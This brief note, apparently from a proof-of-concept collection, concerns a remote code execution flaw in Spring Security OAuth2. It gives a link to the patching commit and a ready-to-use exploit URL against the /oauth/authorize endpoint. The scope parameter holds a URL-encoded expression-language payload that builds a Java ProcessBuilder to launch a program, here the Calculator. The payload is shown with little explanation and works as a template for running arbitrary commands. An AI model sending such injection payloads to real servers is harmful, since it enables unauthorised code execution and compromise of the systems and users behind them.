# oauth2
patch
https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c#diff-e295771f3dccc6549499260adff3775fR108

poc
http://127.0.0.1:8080/oauth/authorize?client_id=tonr&redirect_uri=http://localhost:8089/sparklr/photos&response_type=code&scope=%24%7b(new+java.lang.ProcessBuilder(%22%2fApplications%2fCalculator.app%2fContents%2fMacOS%2fCalculator%22)).start()%7d&state=1uzRv2
